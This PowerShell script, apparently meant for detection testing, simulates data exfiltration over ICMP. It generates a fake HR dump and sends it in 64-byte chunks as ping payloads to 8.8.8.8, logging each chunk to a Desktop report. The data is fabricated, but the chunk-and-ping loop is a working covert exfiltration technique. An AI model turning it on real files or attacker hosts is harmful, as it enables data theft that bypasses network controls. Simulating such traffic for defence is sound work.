# ============================================================
# SCRIPT: ICMP_Exfiltration_Test.ps1
# PURPOSE: Simulate Data Exfiltration via ICMP (Ping)
# OUTPUT: Generates traffic and a report file on Desktop
# ============================================================

# --- CONFIGURATION ---
$TargetIP = "8.8.8.8"        # Destination (Google DNS is good for reliable reply)
$PayloadSize = 64            # Bytes per ping (Linux standard size)
$PacketsToSimulate = 200     # Number of fake data rows (Higher = More traffic)

# --- SETUP PATHS ---
$DesktopPath = [Environment]::GetFolderPath("Desktop")
$ReportFile = "$DesktopPath\icmp_exfiltration_report.txt"

# --- GENERATE FAKE SENSITIVE DATA ---
Write-Host "1. Generating fake sensitive dataset..." -ForegroundColor Cyan

# Create a large string simulating a database export or stolen file
$FakeData = "HEADER:CONFIDENTIAL_HR_DUMP|DATE:2025-05-21|SOURCE:INTERNAL_DB;"
for ($i = 1; $i -le $PacketsToSimulate; $i++) {
    $FakeData += "ROW_$i,User:employee_$i,ID:EMP-$i-99,Salary:5000$i,Access:Level_5;"
}
$FakeData += "FOOTER:END_OF_TRANSMISSION"

# Convert String to Bytes (ASCII)
$BytesData = [System.Text.Encoding]::ASCII.GetBytes($FakeData)
$TotalSize = $BytesData.Length

Write-Host "   Data Size: $TotalSize bytes"
Write-Host "   Target: $TargetIP"
Write-Host "   Report File: $ReportFile"
Write-Host "--------------------------------------------------"
Start-Sleep -Seconds 2

# --- PREPARE LOGGING ---
$LogEntries = @()
$LogEntries += "=================================================="
$LogEntries += "ICMP EXFILTRATION TRAFFIC LOG"
$LogEntries += "Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
$LogEntries += "Target: $TargetIP"
$LogEntries += "Payload Size: $PayloadSize bytes"
$LogEntries += "=================================================="
$LogEntries += ""

# --- NETWORK SETUP ---
$PingSender = New-Object System.Net.NetworkInformation.Ping
$PingOptions = New-Object System.Net.NetworkInformation.PingOptions
$PingOptions.DontFragment = $true # Prevent fragmentation to keep payload solid

# --- MAIN LOOP (FLOOD) ---
Write-Host "2. Starting ICMP Flood (Exfiltration)..." -ForegroundColor Cyan

$Offset = 0
$Sequence = 1

while ($Offset -lt $TotalSize) {
    
    # Calculate current chunk size
    if (($Offset + $PayloadSize) -gt $TotalSize) {
        $ChunkLen = $TotalSize - $Offset
    } else {
        $ChunkLen = $PayloadSize
    }
    
    # Extract the data chunk
    $Buffer = New-Object Byte[] $ChunkLen
    [Array]::Copy($BytesData, $Offset, $Buffer, 0, $ChunkLen)
    
    # Convert back to text for display/logging
    $ChunkText = [System.Text.Encoding]::ASCII.GetString($Buffer)
    
    # SEND THE PACKET
    try {
        # Send(IP, Timeout_ms, Buffer, Options)
        $Reply = $PingSender.Send($TargetIP, 200, $Buffer, $PingOptions)
        
        if ($Reply.Status -eq "Success") {
            $StatusLog = "SENT"
        } else {
            $StatusLog = "TIMEOUT/DROP"
        }
        
        # Log to memory
        $LogEntries += "SEQ: $Sequence | STATUS: $StatusLog | DATA: $ChunkText"
        
        # Print progress to console (every 10th packet to avoid lag, but send ALL)
        if ($Sequence % 10 -eq 0) {
            Write-Host "   [$Sequence] Sent $ChunkLen bytes ($StatusLog)..." -ForegroundColor Green
        }
    }
    catch {
        Write-Host "   [$Sequence] ERROR sending packet." -ForegroundColor Red
        $LogEntries += "SEQ: $Sequence | ERROR | DATA: [Transmission Failed]"
    }
    
    # Increment counters
    $Offset += $PayloadSize
    $Sequence++
    
    # Speed Control: 10ms delay = High traffic volume
    Start-Sleep -Milliseconds 10
}

# --- SAVE REPORT ---
Write-Host "--------------------------------------------------"
Write-Host "3. Saving report to Desktop..." -ForegroundColor Cyan

try {
    $LogEntries | Out-File -FilePath $ReportFile -Encoding UTF8
    Write-Host "   SUCCESS: Report saved as 'icmp_exfiltration_report.txt'" -ForegroundColor Yellow
}
catch {
    Write-Host "   ERROR: Could not save file." -ForegroundColor Red
}

Write-Host "--------------------------------------------------"
Write-Host "Simulation Complete."
Write-Host "Press Enter to exit..."
$null = Read-Host
